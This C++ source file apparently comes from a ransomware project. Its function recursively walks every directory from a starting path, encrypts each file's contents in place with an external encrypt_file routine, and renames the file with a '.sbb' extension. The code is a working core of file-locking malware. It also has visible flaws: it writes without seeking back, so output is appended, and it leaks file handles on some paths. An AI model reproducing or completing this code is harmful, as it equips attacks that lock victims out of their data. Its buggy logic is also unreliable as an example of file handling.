#define _CRT_SECURE_NO_WARNINGS
#include "find_file.h"
#include "encryp.h"

#include<filesystem>
#include<fstream>


void find_file_recursive(const std::wstring path,bool root)
{
    WIN32_FIND_DATA fd;


	if (!SetCurrentDirectoryW(path.c_str()))
	{
		std::wcout << "SetCurrentDirectoryW failed with path " << "(" << path.c_str() << ")";
		return;
	}

    std::wstring file_name = path;
    file_name.append(L"\\*.*");

	HANDLE hFind = ::FindFirstFileW(file_name.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        WCHAR file_full_path[MAX_PATH]{};
        
        do
        {

            //先把目录拷贝进去,再拷贝文件名
            wcscpy(file_full_path, path.c_str());
            if(!root)
            wcscat(file_full_path, L"\\");
            wcscat(file_full_path, fd.cFileName);


            //std::wcout << file_full_path << std::endl;

            std::error_code er{};
            if (std::filesystem::is_directory(file_full_path,er))
            {
                if(fd.cFileName[0] != L'.') /*排除 .和..*/
                    find_file_recursive(file_full_path,false);
            }
            else  //是文件,执行文件加密
            {
                std::wcout << file_full_path << std::endl;

                //https://bbs.csdn.net/topics/390740963
                //这里确实c++标准库有个问题,只能用fopen了

                FILE* f = _wfopen(file_full_path, L"rb+");
                if (!f)
                    continue;

                uint32_t file_size =  std::filesystem::file_size(file_full_path);
                if (!file_size)
                    continue;

                uint8_t* fb = new uint8_t[file_size];
                fread(fb, 1, file_size, f);
                
                encrypt_file(fb, file_size);
                size_t si = fwrite(fb, 1, file_size, f);

                delete[] fb;

                //rename也没有wchar版本
                bool b = MoveFileW(file_full_path, ((std::wstring)file_full_path).append(L".sbb").c_str());
                if (!b) {
                    //std::wcout << ((std::wstring)file_full_path).append(L".sbb").c_str() << std::endl;
                    //std::cout << "[*]rename failed with error code " << std::hex << GetLastError() << std::endl;
                }
                fclose(f);

            }

            RtlZeroMemory(file_full_path, sizeof(file_full_path));



        } while (::FindNextFileW(hFind, &fd));
        ::FindClose(hFind);
    }

}